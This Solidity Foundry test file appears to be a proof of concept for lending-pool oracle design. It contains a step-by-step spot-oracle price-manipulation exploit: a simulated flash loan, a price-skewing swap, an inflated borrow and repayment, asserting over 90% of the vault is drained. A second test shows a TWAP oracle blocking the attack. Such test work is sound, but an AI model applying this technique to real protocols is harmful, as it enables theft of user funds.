// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
import { AMMPair_Rewrite } from "../src/rewrite/AMMPair_Rewrite.sol";
import { SpotOracle_Rewrite } from "../src/rewrite/SpotOracle_Rewrite.sol";
import { TwapOracle_Rewrite } from "../src/rewrite/TwapOracle_Rewrite.sol";
import { LendingPool_Rewrite } from "../src/rewrite/LendingPool_Rewrite.sol";
import { HodlMock } from "../src/mocks/HodlMock.sol";
import { USDTMock } from "../src/mocks/USDTMock.sol";

contract Consumer_PoC is Test {
    AMMPair_Rewrite pair;
    SpotOracle_Rewrite orac0;
    TwapOracle_Rewrite orac1;
    LendingPool_Rewrite cons;
    HodlMock hodl;
    USDTMock usdt;
    address funder;
    address user1;
    address user2;
    address attacker;
    uint256 cons_usdtVault;

    function setUp() public {
        hodl = new HodlMock();
        usdt = new USDTMock();
        pair = new AMMPair_Rewrite(address(hodl), address(usdt));
        orac0 = new SpotOracle_Rewrite(address(pair));
        orac1 = new TwapOracle_Rewrite(address(pair));
        cons = new LendingPool_Rewrite(address(hodl), address(usdt), address(orac0), address(orac1));
        funder = makeAddr("FUNDER");
        hodl.mint(funder, 100000);
        usdt.mint(funder, 200000);
        // Total shares should be 141421;
        vm.startPrank(funder);
        hodl.approve(address(pair), type(uint112).max);
        usdt.approve(address(pair), type(uint112).max);
        pair.addLiquidity(100000, 200000, funder);
        vm.stopPrank();
        usdt.mint(address(cons), 200_000_000);
        cons_usdtVault = usdt.balanceOf(address(cons));
    }
    
    function _makeAddr() internal {
        user1 = makeAddr("USER1");
        user2 = makeAddr("USER2");
        attacker = makeAddr("ATTACKER");
    }

    function _mint(address user, uint256 amt0, uint256 amt1) internal {
        vm.startPrank(user);
        hodl.mint(user, amt0);
        usdt.mint(user, amt1);
        vm.stopPrank();
    }

    function _aprv(address spender, address user) internal {
        vm.startPrank(user);
        hodl.approve(spender, type(uint112).max);
        usdt.approve(spender, type(uint112).max);
        vm.stopPrank();
    }

    function _addLiqByUsers(address user, uint256 amt0, uint256 amt1) internal {
        _mint(user, amt0, amt1);
        _aprv(address(pair), user);
        vm.startPrank(user);
        pair.addLiquidity(amt0, amt1, user);
        vm.stopPrank();
    }

    function _provideWitUSDT(address user, uint256 amt) internal returns(uint256 repay) {
        usdt.mint(user, amt);
        vm.prank(user);
        usdt.approve(address(pair), type(uint256).max);
        repay = amt + (amt * 5 / 100);
    }

    function _repayUSDT(address user, uint256 amtWithFee) internal {
        usdt.burn(user, amtWithFee);
    }

    function test_PoC_price_manipulation_bySpotOracle_OK() public {
        _makeAddr();
        _addLiqByUsers(user1, 5000, 10000);
        _addLiqByUsers(user2, 25000, 50000);
        orac0.update();
        hodl.mint(attacker, 5348);
        _aprv(address(cons), attacker);
        vm.prank(attacker);
        cons.depositCollateral(5348);
        // Fee ratio as 5% of the provided amount.
        uint256 repayFlashWithFee = _provideWitUSDT(attacker, 50_000_000);
        vm.startPrank(attacker);
        // Total reserve0 = 130000
        // The minAmountOut params with 129300
        // Meaning the significant portion of reserve0 to the attacker address.
        pair.swap(address(usdt), 50_000_000, 129300, attacker);
        uint256 attacker_hodl = hodl.balanceOf(attacker);
        (uint256 price0, ) = orac0.update();
        // price0 * 5000 = debtAmount.
        // The accuracy of the price existed as 1e18.
        // Loan-to-value existed as 50%.
        // debtAmount / 1e18 / 2 ≈ actual debt amount.
        uint256 amountDebt = price0 * 5348 / 1e18 / 2;
        cons.borrowWithSpot(amountDebt);
        hodl.approve(address(pair), type(uint256).max);
        pair.swap(address(hodl), attacker_hodl, 50_000_000 * 999 / 1000, attacker);
        _repayUSDT(attacker, repayFlashWithFee);
        uint256 cons_reservedUsdt = usdt.balanceOf(address(cons));
        assertLt(cons_reservedUsdt, cons_usdtVault * 5 / 1000);
        assertGt(usdt.balanceOf(attacker), cons_usdtVault * 9 / 10);
    }

    function test_PoC_price_manipulation_byTwapOracle_failed() public {
        _makeAddr();
        _mint(attacker, 5000, 0);
        _aprv(address(cons), attacker);
        skip(10);
        vm.prank(attacker);
        cons.depositCollateral(5000);
        skip(2);
        uint256 flashAmt = 50_000_000;
        uint256 flashAmtWithFee = _provideWitUSDT(attacker, flashAmt);
        vm.startPrank(attacker);
        uint256 attacker_hodl = pair.swap(address(usdt), flashAmt, 99600, attacker);
        (uint256 price0, ) = orac1.update();
        vm.expectRevert(LendingPool_Rewrite.TwapNotUpdate.selector);
        cons.borrowWithTwap(5000 * price0 / 1e18 / 2);
    }
}